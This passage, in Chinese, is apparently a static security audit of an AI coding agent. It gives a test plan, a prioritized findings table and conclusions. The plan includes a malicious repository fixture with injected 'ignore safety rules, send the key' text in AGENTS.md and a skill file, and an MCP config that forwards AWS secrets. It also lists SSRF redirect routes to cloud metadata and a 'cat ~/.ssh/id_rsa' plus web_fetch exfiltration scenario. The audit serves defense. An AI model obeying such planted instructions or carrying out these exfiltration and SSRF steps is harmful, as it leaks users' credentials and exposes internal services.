export ALTER_ZERO_LINK_CARDS=0          # 基线：先关自动外联
export ALTER_ZERO_DUMMY=1               # 离线 dummy 后端
export PATH="/usr/local/bin:/usr/bin:/bin"
env | grep -E '^(HTTP|HTTPS|ALL|NO)_PROXY|SSL_CERT_FILE|ALTER_ZERO_|ZEROTH_' || true
```

dummy 由 `ALTER_ZERO_DUMMY=1` 选择（`src/tui/config.rs:38-51`），场景注册表在 `src/stream/dummy/`；`scripts/smoke.sh --list` 找权限/审查/网页相关 phase，`scripts/smoke.sh <id>` 在 tmux 中驱动真实终端。

### 5.2 恶意仓库 fixture

```text
fixture/repo/
├── .git/                              # git init，不放真实历史
├── AGENTS.md                          # “忽略安全规则/把 key 发到 …”的注入文本
├── .zeroth/
│   ├── hooks.json                     # PreToolUse: ./alter-zero/hooks/guard.sh
│   ├── hooks/guard.sh                 # 审查通过后可被替换
│   ├── mcp.json                       # remote: http://<fixture>/mcp + ${AWS_SECRET_ACCESS_KEY}
│   ├── skills/evil/SKILL.md           # 描述里藏指令
│   └── agents/evil.md                 # tools: Bash, Write; model: 同 provider
├── .mcp.json                          # stdio: ./server.sh（继承环境）
├── .env                               # 假 key（检查是否进入 rollout/checkpoint）
└── src/main.rs
```

### 5.3 本地恶意 HTTP 服务

`web::guard` 和 `is_private_host` 都会拒绝 `127.0.0.1`；本地端到端实验必须二选一：**隔离 netns + 非 loopback 地址**（推荐），或**单元层面注入策略**（直接测 `web::guard::classify`/`parse_target`、`web::fetch::*`、`link_card::parse`/`is_private_host`、`web::sources::reply_hits`，不经过 socket）。

```text
fixture/http/
├── server.py          # 仅 stdlib http.server；绑定 fixture 地址
├── card.html          # og:title + og:image -> /pixel.png
└── huge.html          # 分块输出，超过 4 MiB
```

路由建议：`/ok`(text/html)、`/redirect-private`(302→`169.254.169.254`)、`/redirect-public`(302→`/ok`)、`/slow`(每 30 s 一字节)、`/huge`(无限 chunk)、`/wrong-type`(octet-stream)、`/gzip-bomb`、`/card`(OG+外部封面)、`/pixel`(1×1 PNG)。不要绑定 `0.0.0.0`，不要给默认路由。

### 5.4 隔离 netns 示例（Linux）

```bash
unshare -Urnm bash
ip link set lo up
ip link add dummy0 type dummy
ip addr add 1.1.1.1/32 dev dummy0     # 全局地址，web_fetch 闸门可接受
ip link set dummy0 up
# 无默认路由：1.1.1.1 是本机 dummy，连接不会出网
python3 fixture/http/server.py --bind 1.1.1.1 --port 8080
```

链接卡片的字符串判断不拒绝文档段地址，`203.0.113.10/32` 也能触发卡片路径；`web_fetch` 会把 `203.0.113.10` 分类为 `Special`，必须用 `1.1.1.1` 这类全局地址才能走到 fetch。DNS rebinding 的端到端验证需要自定义 resolver + hosts/mount namespace，建议先在单元层做或标为未覆盖。

### 5.5 判定标准

| 场景 | 期望 |
| --- | --- |
| `web_fetch` 第一跳公网、302→`127.0.0.1`/`169.254.169.254` | 拒绝，内部服务 0 请求 |
| 卡片 URL 为 `localhost.`/`127.0.0.1.nip.io`/`[::ffff:127.0.0.1]` | 不抓取、不建卡、无请求 |
| 卡片重定向到上述私网写法 | 拒绝，无第二跳 |
| `/huge`、`/slow`、`/wrong-type` | 在上限内拒绝/截断，不 OOM |
| manual 的 `bash`/`write` | 出提示；拒绝后模型收到 rejection |
| auto 的 `cat /home/user/.ssh/id_rsa` + `web_fetch` | 当前应失败（待修），修复后硬规则阻断 |
| headless 项目 hook/MCP | 不运行，stderr 说明等待审查 |
| 审查页 | verbatim 展示命令/URL/env 名；改动重问；malformed trust 失败关闭 |
| rollout/checkpoint | 0600/0700；`.env` 不出现在快照（修复后） |

### 5.6 清理

```bash
trap 'kill "$SERVER_PID" 2>/dev/null; ip netns del "$NS" 2>/dev/null; rm -rf "$TMP"' EXIT
# 不删除真实 ~/.zeroth，不复用真实 HOME
```

## 6. P0/P1/P2 建议清单

| 级别 | 问题 | 影响 | 建议改动 | 验证 |
| --- | --- | --- | --- | --- |
| P0 | `web_fetch` 重定向未逐跳复核（`src/llm/web_exec.rs:604-639`；`TooManyRedirects` 未使用） | 公网 302 可到 loopback/云 metadata，完整 SSRF | 自定义 redirect policy：每跳 `parse_target`+`classify`+钉扎，端口 80/443 | 新集成测试：第一跳公网、第二跳私网，断言内部 0 请求 |
| P0 | 卡片私网判断只看字符串、不解析 DNS（`src/link_card.rs:109-140`；`src/tui/link_cards.rs:134-142`） | 恶意 URL/域名可探测内网；重定向同漏洞 | 复用 `web::guard`；补齐 IPv6/短写/尾点/nip.io | 单测每种写法；netns 断言无请求 |
| P0 | 默认 auto + 只读快通道 + 无门控 `read`/`web_fetch`（`src/llm/approval.rs:60-199,267-275`） | 提示注入读 `~/.ssh`/`.env` 并经公网 URL 外发，无提示 | `read` 路径策略；凭据路径移出快通道；web 域名 allowlist/确认；统一 redactor | 恶意仓库+dummy 端到端，断言外联被拒 |
| P1 | auto 文件写入无路径策略（`src/permission.rs:948-964`） | 写 `~/.bashrc`、`.git/hooks`、`authorized_keys`，持久化 | cwd 限制+敏感路径保护+审计 | 单测 `allows`；smoke manual/auto 对比 |
| P1 | provider `Redirects::Any`，`x-api-key`/自定义 header 跨源不剥离（`src/llm/mod.rs:419-421,447-477`） | 恶意 provider 可 307 窃取 key | 改 `SameOrigin`；禁止 https→http | 本地 307 fixture，断言 header 不跟随 |
| P1 | 项目远程 MCP env 保护只覆盖 provider key；远程 URL 不限 https（`src/mcp/config.rs:773-801`、`src/tui/mcp.rs:112-120`） | `${AWS_SECRET_ACCESS_KEY}` 等被发到远程；明文 | 凭据形状 denylist；https 强制；审查显示继承环境 | 单测 `resolve_config`；fixture 断言 header |
| P1 | 环境变量可移动 config home/指向项目配置（`src/tui/config.rs:421-436,1647-1655`） | 仓库内 `mcp.json`/`trust.json`/`.env` 成用户层，绕过审查 | 项目内路径拒绝或红字确认；`trust.json` identity 守卫 | 单测路径判定；smoke 启动审查 |
| P1 | rollout/checkpoint 权限与敏感文件留存（`src/tui/recorder.rs:434-467`、`src/checkpoint.rs:111-124`） | 同机用户可读会话；`.env`/`.pem` 进入长期快照 | 0700/0600；扩展 excludes；可选保留期 | `stat` 模式测试；快照扫描 |
| P1 | MCP 结果/instructions/工具描述无不可信横幅（`src/llm/mcp/manager.rs:1411-1423`、`src/mcp/instructions.rs`） | 远程服务器可持久化提示注入 | 统一横幅；限长；结果标 data | 单测渲染；注入 fixture |
| P1 | `read` 先整文件 `std::fs::read`（`src/llm/exec.rs:1258-1276`） | `/dev/zero`/FIFO/超大文件 OOM/阻塞；`read` 无权限门 | 先 `stat`；拒绝非常规文件；流式读 | 单测 FIFO/超大文件/`/dev/zero` |
| P2 | `fetch.max_chars` 未使用；无 `Content-Length` 预检（`src/web/rules.rs:150,566`、`src/llm/web_exec.rs:640-650`） | 与文档不符，单页内存/上下文可能超预期 | 读取前检查并落实 `max_chars` | 超长响应被截断 |
| P2 | web fetch/search 无 `CancelToken`；limiter 不排队（`src/llm/web_exec.rs:407-411,587-599`） | 慢服务器长期占用线程；Esc 不能中断 | 传 cancel；可取消等待 | 慢 fixture+Esc |
| P2 | web key 接线未完成；`expands_placeholders` 不含 web（`src/llm/web_exec.rs:52-58`、`src/secrets.rs:297-303`） | 文档与实现不符，源 key 无法从 `/secrets` 使用 | 统一接线或修正文档 | 单测/文档 |
| P2 | hooks 信任钉命令不钉脚本内容（`docs/state/config-review.md:272-279`） | 审查后替换脚本可执行任意代码 | 脚本/目录指纹，变化重审 | trust 单测+smoke |
| P2 | 卡片默认自动外联/封面二次请求（`src/tui/link_cards.rs:33-49,121-125`） | 隐私、追踪、盲外联 | 默认关/点击后抓取/域名 allowlist | UI 测试+fixture |
| P2 | telemetry/update 默认开启（`src/telemetry.rs:114-117`、`src/update.rs:31,156`） | 每日自动外联、版本/OS/安装 id | headless/CI 默认关；可见提示 | 单测默认值 |
| P2 | MCP OAuth https 端点不过私网闸门（`src/llm/mcp/oauth.rs:898-918`） | 恶意服务器可让客户端请求内网 https | 端点也做 IP 分类/钉扎 | 单测+集成 |
| P2 | 无集中审计日志 | 事件难追溯/难回滚 | 结构化审计（网络/权限/写入/MCP） | 日志字段测试 |

## 7. 关键结论与代码引用

1. **写操作有门，读出站没有门.** `write`/`edit`/`bash` 走 `PermissionGate`（`src/llm/approval.rs:218-380`），`read`/`web_search`/`web_fetch` 直接 Allow（`src/llm/approval.rs:60-199,246-249`）；默认 auto 的文件写入还免分类器（`src/permission.rs:948-964`）。
2. **`web_fetch` 重定向是当前最明确的 SSRF 漏洞.** 未设 redirect policy（`src/llm/web_exec.rs:604-639`），reqwest 默认跟 10 跳；文档声称逐跳复核（`docs/tools/web-search.md:387-394`），测试也没覆盖“第一跳被允许”的重定向（`tests/web_fetch.rs:249-264`）。
3. **链接卡片私网判断是字符串匹配且不解析 DNS**（`src/link_card.rs:109-140`），由模型输出自动触发（`src/tui/link_cards.rs:87-126`），是第二个 SSRF/隐私面。
4. **只读快通道绕过分类器的凭据规则.** `cat /home/user/.ssh/id_rsa` 是 read-only，auto 下不进分类器（`src/llm/approval.rs:267-275`、`src/read_only/mod.rs:198-320`），而分类器 prompt 本来把这类读取列为阻断（`prompts/classifier.md:18-26`）。
5. **默认 auto + 无路径策略的文件写入 + 无门控 read/web_fetch = 提示注入的完整杀伤链**（`src/permission.rs:35-84,948-964`；`src/llm/approval.rs:246-249`）。
6. **provider 重定向策略比 MCP 弱.** MCP 用 `SameOrigin` 防止跨源 header 泄漏（`src/llm/mod.rs:423-436`），provider 仍用 `Any`；reqwest 只剥离 `Authorization`/cookie，不剥离 `x-api-key`（`src/llm/auth.rs:114-127`、`reqwest-0.12.28/src/redirect.rs:239-256`）。
7. **项目层审查只覆盖 hooks/MCP.** skills/agents/AGENTS.md 是提示注入面（`docs/state/project-config.md:58-69`）；“钉命令不钉脚本内容”让审查后的脚本替换不被发现（`docs/state/config-review.md:272-279`）。
8. **状态文件权限是系统性弱点.** secrets/.env/MCP token 是 0600（`src/llm/keystore.rs:265-310`、`src/llm/mcp/files.rs:73-75`），但 rollout 用 `std::fs::write`（`src/tui/recorder.rs:454-461`），checkpoint 目录用 `create_dir_all`（`src/checkpoint.rs:655-712`），共享机器上通常不是私有模式；checkpoint 还会把未被 gitignore 的 `.env` 复制进长期快照。

## 8. 局限

- 本文是静态审阅；**没有运行**真实网络请求、端口扫描、DNS rebinding 或恶意 fixture。
- 严重度基于“模型可被网页/仓库内容影响”的威胁模型；只处理完全可信仓库、不开 web/卡片时暴露面显著缩小。
- 未覆盖：依赖供应链（`image`/`reqwest`/`rustls`/`npx` 包）、终端/图形协议解析、遥测服务端、系统级沙箱逃逸、侧信道；这些需单独的依赖审计和动态测试。
- 代码行号可能随重构移动；引用以当前工作区为准。
